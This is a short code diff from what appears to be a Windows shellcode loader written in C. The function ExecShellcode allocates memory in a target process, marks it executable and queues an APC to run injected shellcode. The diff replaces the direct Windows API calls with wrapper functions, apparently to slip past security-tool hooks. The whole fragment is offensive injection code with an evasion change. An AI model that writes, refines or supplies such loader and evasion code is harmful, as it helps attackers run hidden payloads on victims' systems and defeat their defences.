@@ -41,7 +41,7 @@ VOID ExecShellcode(PBYTE shellcode) {
         return;
     }
 
-    LPVOID memPoolPtr = VirtualAllocEx(hProcess, NULL, shellcode_sz, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
+    LPVOID memPoolPtr = WrapperVirtualAllocEx(hProcess, NULL, shellcode_sz, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
     if (!memPoolPtr) {
         printf("[!] VirtualAllocEx Failed : %u\n", GetLastError());
         return;
@@ -55,10 +55,10 @@ VOID ExecShellcode(PBYTE shellcode) {
     printf("[+] Shellcode written (%d Bytes)\n", shellcode_sz);
 
     DWORD oldProt = 0;
-    VirtualProtectEx(hProcess, memPoolPtr, shellcode_sz, PAGE_EXECUTE_READ, &oldProt);
+    WrapperVirtualProtectEx(hProcess, memPoolPtr, shellcode_sz, PAGE_EXECUTE_READ, &oldProt);
 
     // Queue APC
-    if (!QueueUserAPC((PAPCFUNC)memPoolPtr, hThread, 0)) {
+    if (!WrapperQueueUserAPC((PAPCFUNC)memPoolPtr, hThread, 0)) {
         printf("[!] QueueUserAPC failed : %u\n", GetLastError());
     } else {
         printf("[+] APC Queued successfully.\n");
